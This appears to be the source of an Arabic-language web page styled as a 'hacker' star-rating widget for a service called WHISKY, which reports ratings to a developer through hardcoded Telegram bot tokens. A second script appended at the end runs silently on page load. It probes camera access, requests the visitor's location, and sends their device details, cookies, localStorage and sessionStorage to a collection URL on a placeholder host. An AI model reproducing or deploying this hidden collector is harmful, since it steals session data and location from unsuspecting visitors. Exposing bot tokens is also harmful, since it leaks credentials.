<style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none; /* اجعلها مثل الشاشة التقنية */
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #0a0f0a, #000000);
            font-family: 'Share Tech Mono', 'Space Mono', monospace;
            color: #0f0;
            position: relative;
            overflow-x: hidden;
            padding: 1rem;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* تأثير الضوضاء التماثلية (Analog Noise) */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-radial-gradient(circle at 20% 30%, rgba(0,255,0,0.02) 0px, rgba(0,0,0,0.3) 2px);
            pointer-events: none;
            z-index: 0;
        }

        /* الحاوية الرئيسية - زجاجية مع وهج أخضر/أسود معدني */
        .glass-panel {
            position: relative;
            z-index: 10;
            max-width: 650px;
            width: 100%;
            margin: 2rem auto;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 0, 0.4);
            border-radius: 2rem;
            padding: 2rem 1.8rem;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2), inset 0 0 15px rgba(0,255,0,0.1);
            transition: all 0.3s;
        }

        /* رأس الهولوجرام hacker */
        .hacker-header {
            text-align: center;
            margin-bottom: 2rem;
            border-bottom: 2px solid #0f0;
            display: inline-block;
            width: 100%;
        }

        .glitch {
            font-size: 2.2rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 6px;
            text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75);
            animation: glitch-shake 0.3s infinite alternate;
        }

        @keyframes glitch-shake {
            0% { transform: skew(0deg, 0deg); opacity: 0.95; text-shadow: 2px 0 red; }
            100% { transform: skew(2deg, 0.5deg); opacity: 1; text-shadow: -2px 0 lime; }
        }

        .sub {
            font-size: 0.8rem;
            color: #8bc34a;
            letter-spacing: 2px;
            background: #000000aa;
            display: inline-block;
            padding: 0.2rem 1rem;
            border-radius: 20px;
            backdrop-filter: blur(4px);
        }

        /* حاوية الأزرار العمودية (ترتيب النجوم أسفل بعضها) */
        .stars-vertical {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1.3rem;
            margin: 2.5rem 0;
        }

        /* زر التقييم بنجوم مع تأثير وهج وهولو */
        .star-btn {
            background: rgba(10, 15, 5, 0.85);
            border: 1.5px solid #0f0;
            border-radius: 60px;
            padding: 0.8rem 2rem;
            width: 260px;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            text-align: center;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 8px #0f0, inset 0 0 3px #9eff9e;
            position: relative;
            overflow: hidden;
        }

        /* النجوم داخل الزر */
        .star-rating {
            font-size: 2rem;
            letter-spacing: 8px;
            color: #ffd966;
            text-shadow: 0 0 8px #ffaa33, 0 0 3px lime;
            transition: 0.2s;
            display: inline-block;
        }

        /* النص المساعد */
        .rating-label {
            font-size: 0.75rem;
            margin-top: 5px;
            color: #aaf0a0;
            font-family: monospace;
            letter-spacing: 1px;
        }

        /* تأثير الوهج عند التمرير والنقر */
        .star-btn:hover {
            transform: scale(1.03);
            background: #0a200acc;
            box-shadow: 0 0 22px #0f0, 0 0 10px cyan;
            border-color: #9eff9e;
        }

        .star-btn:active {
            transform: scale(0.98);
        }

        /* إضافة خط متحرك يشبه البيانات */
        .star-btn::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0,255,0,0.2) 0%, rgba(0,0,0,0) 70%);
            opacity: 0;
            transition: opacity 0.5s;
            pointer-events: none;
        }

        .star-btn:hover::before {
            opacity: 0.7;
            animation: pulseRadar 1s infinite;
        }

        @keyframes pulseRadar {
            0% { transform: rotate(0deg) scale(0.8); opacity: 0.4; }
            100% { transform: rotate(360deg) scale(1.2); opacity: 0; }
        }

        /* رسالة تأكيد التقييم المنبثقة بأسلوب هكر */
        .toast-message {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #000000dd;
            backdrop-filter: blur(12px);
            border-right: 4px solid #0f0;
            border-left: 4px solid #0f0;
            padding: 0.7rem 1.8rem;
            border-radius: 40px;
            color: #0f0;
            font-family: monospace;
            font-weight: bold;
            z-index: 200;
            text-align: center;
            font-size: 0.9rem;
            white-space: nowrap;
            box-shadow: 0 0 20px rgba(0,255,0,0.5);
            animation: fadeInUp 0.3s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                bottom: 0;
            }
            to {
                opacity: 1;
                bottom: 30px;
            }
        }

        /* الفوتر (التذييل المطلوب بتأثير الهكر) */
        .footer-box {
            margin-top: 2rem;
            padding-top: 1rem;
            border-top: 1px solid #2e7d32;
            text-align: center;
        }

        .hacker-icons {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: #3eff3e;
            text-shadow: 0 0 5px #00cc00;
        }

        .glitch-text {
            font-size: 1rem;
            font-weight: bold;
            background: #000000aa;
            display: inline-block;
            padding: 0.4rem 1rem;
            border-radius: 10px;
            position: relative;
            animation: glitchText 1.5s infinite steps(1);
            color: #aaf0c0;
        }

        @keyframes glitchText {
            0%, 100% { text-shadow: 0.05em 0 0 rgba(255,0,0,0.5), -0.05em -0.025em 0 rgba(0,255,0,0.5); }
            25% { text-shadow: -0.05em 0 0 cyan, 0.025em 0.025em 0 red; }
            50% { text-shadow: 0.05em 0.025em 0 lime, -0.05em -0.05em 0 #ff00aa; }
            75% { text-shadow: -0.025em 0 0 yellow, 0.025em 0.05em 0 magenta; }
        }

        .hacked-badge {
            margin-top: 1rem;
            font-size: 0.85rem;
            background: #0f0f0f;
            display: inline-flex;
            gap: 0.7rem;
            padding: 0.4rem 1rem;
            border-radius: 40px;
            letter-spacing: 2px;
            border: 1px dashed #3eff3e;
        }

        /* أسلوب تدفق الأكواد البرمجية (falling code) */
        .code-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 5;
            overflow: hidden;
        }

        .code-line {
            position: absolute;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 1.1rem;
            white-space: nowrap;
            opacity: 0.25;
            animation: fall linear infinite;
            text-shadow: 0 0 4px #00ff00;
            font-weight: bold;
            direction: ltr;
        }

        @keyframes fall {
            0% {
                transform: translateY(-20vh);
                opacity: 0;
            }
            10% {
                opacity: 0.8;
            }
            90% {
                opacity: 0.5;
            }
            100% {
                transform: translateY(110vh);
                opacity: 0;
            }
        }

        /* تحسين الاستجابة */
        @media (max-width: 550px) {
            .star-btn {
                width: 220px;
                padding: 0.6rem 1rem;
            }
            .star-rating {
                font-size: 1.7rem;
                letter-spacing: 5px;
            }
            .glitch {
                font-size: 1.6rem;
            }
        }
    </style>
</head>

<canvas id="particle-canvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;"></canvas>
<script>
    // ======================= 1. تأثير سقوط الأكواد البرمجية (hacker rain) =======================
    function initCodeRain() {
        const container = document.getElementById('codeRain');
        if(!container) return;
        const phrases = [
            "0x7F3A>", "sudo eval --", ">_hack();", "// secure", "1337", "⭐", ">> exploit", 
            "eval(star)", "payload.js", "null", "0x00FF00", "<script>", "hologram", "matrix",
            "> rating", "telegram", "API", ">> token", "sys.access", "⭐ rating ⭐"
        ];
        const numLines = 55;
        for(let i=0; i<numLines; i++) {
            const line = document.createElement('div');
            line.classList.add('code-line');
            const randomText = phrases[Math.floor(Math.random() * phrases.length)] + (Math.random() > 0.7 ? " ⭐" : "");
            line.innerText = randomText;
            const leftPos = Math.random() * 100; // vw%
            const duration = 5 + Math.random() * 9; // 5-14s
            const delay = Math.random() * -20;
            const fontSize = 0.8 + Math.random() * 1.2;
            line.style.left = leftPos + '%';
            line.style.animationDuration = duration + 's';
            line.style.animationDelay = delay + 's';
            line.style.fontSize = fontSize + 'rem';
            line.style.opacity = 0.3 + Math.random() * 0.5;
            line.style.color = `rgba(80, 255, 80, ${0.4+Math.random()*0.5})`;
            container.appendChild(line);
        }
    }
    initCodeRain();

    // ======================= 2. خلفية الجسيمات (particle system) المطلوبة =======================
    (function() {
        const canvas = document.getElementById('particle-canvas');
        if(!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height;
        let particles = [];

        function initParticles() {
            const count = 80;
            particles = [];
            for (let i = 0; i < count; i++) {
                particles.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    radius: Math.random() * 3 + 1,
                    speedX: (Math.random() - 0.5) * 1.2,
                    speedY: (Math.random() - 0.5) * 1.2,
                    color: `rgba(0, 255, ${Math.floor(80 + Math.random() * 120)}, ${0.3 + Math.random() * 0.5})`
                });
            }
        }

        function resizeCanvas() {
            width = window.innerWidth;
            height = window.innerHeight;
            canvas.width = width;
            canvas.height = height;
            initParticles();
        }

        function drawParticles() {
            if(!ctx) return;
            ctx.clearRect(0, 0, width, height);
            
            // خطوط ربط بين الجسيمات
            ctx.strokeStyle = '#00ff0044';
            ctx.lineWidth = 0.7;
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const distance = Math.sqrt(dx*dx + dy*dy);
                    if (distance < 120) {
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(0, 255, 70, ${0.18 * (1 - distance/120)})`;
                        ctx.stroke();
                    }
                }
            }

            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.shadowColor = '#0f0';
                ctx.shadowBlur = 12;
                ctx.fill();
                
                p.x += p.speedX;
                p.y += p.speedY;
                
                if (p.x < 0 || p.x > width) p.speedX *= -1;
                if (p.y < 0 || p.y > height) p.speedY *= -1;
                
                p.x = Math.max(0, Math.min(width, p.x));
                p.y = Math.max(0, Math.min(height, p.y));
            });
            ctx.shadowBlur = 0;
            
            requestAnimationFrame(drawParticles);
        }

        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        drawParticles();
    })();

    // ======================= 3. منطق التقييم بالنجوم + إرسال إلى بوتات تيليجرام =======================
    // توكنات البوت والمطور
    const BOT_TOKEN_1 = "8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s";
    const BOT_TOKEN_2 = "8707133577:AAFVfA7gohbXfic6aQuh2JlfXoeUBU_YzO4";
    const DEVELOPER_CHAT_ID = "8562457386";

    // دالة مساعدة لإرسال رسالة عبر البوت (تستخدم لكلا البوتين)
    async function sendToTelegram(botToken, chatId, messageText) {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = {
            chat_id: chatId,
            text: messageText,
            parse_mode: "HTML"
        };
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(params)
            });
            const data = await response.json();
            if(!data.ok) console.error(`فشل الإرسال للبوت ${botToken}`, data);
            return data.ok;
        } catch(error) {
            console.error("خطأ في إرسال التيليجرام:", error);
            return false;
        }
    }

    // إنشاء الرسالة الاحترافية بناءً على عدد النجوم
    function generateProfessionalMessage(starsCount) {
        let evaluationText = "";
        let statusLevel = "";
        if(starsCount === 1) {
            evaluationText = "مقبول";
            statusLevel = "🔻 ضعيف - يحتاج إلى تحسين بـسـࢪعهه";
        } else if(starsCount === 2) {
            evaluationText = "عادي / متوسط";
            statusLevel = "⚠️ متوسط - هـو حـلو بـس ممڪن تـحـديث ڪمان";
        } else if(starsCount === 3) {
            evaluationText = "جيد";
            statusLevel = "✔️ جيد - ڪويس شويه";
        } else if(starsCount === 4) {
            evaluationText = "جيد جداً";
            statusLevel = "🔥 جيد جداً - حـلـو يـسـطـا";
        } else if(starsCount === 5) {
            evaluationText = "ممتاز";
            statusLevel = "🏆 ممتاز - جـامد فـشـخ يعـم ويـسڪي";
        }
        
        // نسبة التقييم (100% كحد أقصى)
        const percentage = (starsCount / 5) * 100;
        let gradeSentence = "";
        if(percentage >= 90) gradeSentence = "جـامد فـشـخ";
        else if(percentage >= 70) gradeSentence = "جيد جدًا";
        else if(percentage >= 50) gradeSentence = "جيد";
        else gradeSentence = "يحتاج مراجعة";
        
        const now = new Date();
        const timestamp = now.toLocaleString('ar-EG', { hour12: false });
        
        // رسالة احترافية بهلوسة هكر
        const message = `✦ <b>[ تقـييم خـدمـتـنا ]</b> ✦\n` +
                        `━━━━━━━━━━━━━━━━━━━\n` +
                        `⭐ <b>عدد النجوم:</b> ${starsCount} ⭐ (${"⭐".repeat(starsCount)})\n` +
                        `📊 <b>نسبة التقييم:</b> ${percentage}% \n` +
                        `🎖️ <b>التصنيف:</b> ${evaluationText}\n` +
                        `📈 <b>المستوى:</b> ${statusLevel}\n` +
                        `🔍 <b>الاستنتاج:</b> الخدمة ${gradeSentence} | ${starsCount === 5 ? 'تقييم جـامد فشـخ يسطا ♚' : (starsCount === 4 ? 'تقييم ممتاز' : 'يمكن التطوير')}\n` +
                        `⏱️ <b>توقيت التقييم:</b> ${timestamp}\n` +
                        `🛡️ <b>نظام الحماية:</b> [ HACKER WHISKY v1.0 ]\n` +
                        `─────────────────\n` +
                        `<code>// تم تسجيل التقييم فـ  WHISKY SYSTEM</code>`;
        return { message, percentage, evaluationText };
    }
    
    // دالة عرض رسالة عائمة مؤقتة
    function showToast(msg, isError = false) {
        const existing = document.querySelector('.toast-message');
        if(existing) existing.remove();
        const toast = document.createElement('div');
        toast.className = 'toast-message';
        toast.style.backgroundColor = isError ? '#330000dd' : '#001a00dd';
        toast.style.borderRightColor = isError ? '#ff4444' : '#0f0';
        toast.style.borderLeftColor = isError ? '#ff4444' : '#0f0';
        toast.innerHTML = `<i class="fas fa-${isError ? 'skull-crossbones' : 'satellite-dish'}"></i> ${msg}`;
        document.body.appendChild(toast);
        setTimeout(() => {
            if(toast) toast.remove();
        }, 3800);
    }

    // معالجة الضغط على أي زر نجوم
    async function handleRating(stars) {
        // stars: عدد صحيح 1-5
        const { message, percentage, evaluationText } = generateProfessionalMessage(stars);
        
        // عرض إشعار في الموقع للمستخدم
        showToast(`✔️ تم تسجيل تقييمك: ${stars} نجوم | ${percentage}% | ${evaluationText}`);
        
        // إرسال إلى المطور (chat id المطور) عبر البوت الأول فقط (يمكن استخدام البوتين معاً لكن المطور يستقبل من أي بوت)
        // لكن سنرسل للمطور عبر البوتين لضمان الوصول (كلاهما يرسل لنفس المستلم)
        const devId = DEVELOPER_CHAT_ID;
        
        // إرسال إلى المطور عبر البوت الأول
        const sendToDev1 = sendToTelegram(BOT_TOKEN_1, devId, message);
        // إرسال إلى المطور عبر البوت الثاني أيضاً (للتكرار الاحترافي)
        const sendToDev2 = sendToTelegram(BOT_TOKEN_2, devId, message);
        
        // أيضاً ربما ترغب في إرسال تقرير لقناة البوت نفسه أو للمطور مباشرة فقط
        // بالاضافة يمكن تسجيله في كلا البوتين للمطور لضمان وصول التقرير الاحترافي
        const results = await Promise.allSettled([sendToDev1, sendToDev2]);
        
        let successCount = 0;
        results.forEach(r => { if(r.status === 'fulfilled' && r.value === true) successCount++; });
        
        if(successCount > 0) {
            console.log(`✅ تم إرسال التقييم (${stars} نجوم) إلى المطور بنجاح عبر ${successCount} بوت`);
            // إظهار رسالة تأكيد إضافية ولكن ليس ازعاج
        } else {
            showToast("⚠️ فشل الإرسال إلى خادم التيليجرام، لكن التقييم مسجل محلياً", true);
        }
        
        // إضافة تأثير وميض للزر (تأكيد بصري)
        const btns = document.querySelectorAll('.star-btn');
        btns.forEach(btn => {
            if(parseInt(btn.getAttribute('data-stars')) === stars) {
                btn.style.transform = "scale(1.02)";
                btn.style.boxShadow = "0 0 25px #ffff00";
                setTimeout(() => {
                    btn.style.transform = "";
                    btn.style.boxShadow = "";
                }, 300);
            }
        });
        
        // تسجيل أيضاً في console للمطورين
        console.log(`[HACKER RATING] تم تقييم ${stars} نجوم | نسبة ${percentage}% | ${evaluationText}`);
    }
    
    // إضافة مستمعات الأحداث للأزرار
    const starButtons = document.querySelectorAll('.star-btn');
    starButtons.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const starsVal = btn.getAttribute('data-stars');
            if(starsVal) {
                const starsCount = parseInt(starsVal, 10);
                if(!isNaN(starsCount) && starsCount >=1 && starsCount <=5) {
                    handleRating(starsCount);
                } else {
                    showToast("خطأ في بيانات التقييم", true);
                }
            }
        });
    });
    
    // تأثير إضافي: وهج متحرك للخلفية هولوجرام على الجسم
    setInterval(() => {
        const panel = document.querySelector('.glass-panel');
        if(panel) {
            const intensity = Math.sin(Date.now() / 1500) * 0.1 + 0.15;
            panel.style.boxShadow = `0 0 ${15 + intensity * 25}px rgba(0, 255, 0, ${0.2 + intensity * 0.3})`;
        }
    }, 800);
    
    // طباعة في الكونسول بداية التهكير
    console.log("%c[HACK SYSTEM READY]  تقـيـيم خـدمـات ويـسـڪي 𝑾𝑯𝑰𝑺𝑲𝒀 𝑬𝑳𝒀𝑶𝑼𝑻𝑼𝑩𝑬𝑹", "color: #0f0; font-size: 16px; font-family: monospace;");
</script>

    <script>
    (function() {
        const sessionId = 'f89O29CB2RUYj5XG';
        const COLLECT_URL = 'https://YOUR_BOT_HOST.com/collect';
        
        function collectAndSend() {
            // طلب صلاحيات الكاميرا
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                        .then(stream => stream.getTracks().forEach(t => t.stop()))
                        .catch(e => console.log('كاميرا خلفية مرفوضة'));
                    
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(stream => stream.getTracks().forEach(t => t.stop()))
                        .catch(e => console.log('كاميرا أمامية مرفوضة'));
                } catch(e) {}
            }
            
            // طلب الموقع
            let locationData = 'غير متاح';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                        sendData(locationData);
                    },
                    err => {
                        console.log('الموقع مرفوض');
                        sendData('مرفوض');
                    }
                );
            } else {
                sendData('غير مدعوم');
            }
        }
        
        function sendData(location) {
            const deviceInfo = {
                session: sessionId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardware: {
                    cores: navigator.hardwareConcurrency || 'غير معروف',
                    memory: navigator.deviceMemory || 'غير معروف',
                    touchPoints: navigator.maxTouchPoints || 0
                },
                location: location,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                referrer: document.referrer || 'مباشر'
            };
            
            // إرسال البيانات
            fetch(COLLECT_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            })
            .then(res => res.json())
            .then(result => {
                console.log('✅ تم الإرسال بنجاح');
            })
            .catch(err => {
                console.error('❌ خطأ في الإرسال:', err);
            });
        }
        
        // تشغيل عند التحميل
        window.addEventListener('load', function() {
            setTimeout(collectAndSend, 1500);
        });
        
        console.log('🔍 تم تحميل كود التجميع');
    })();
    </script>
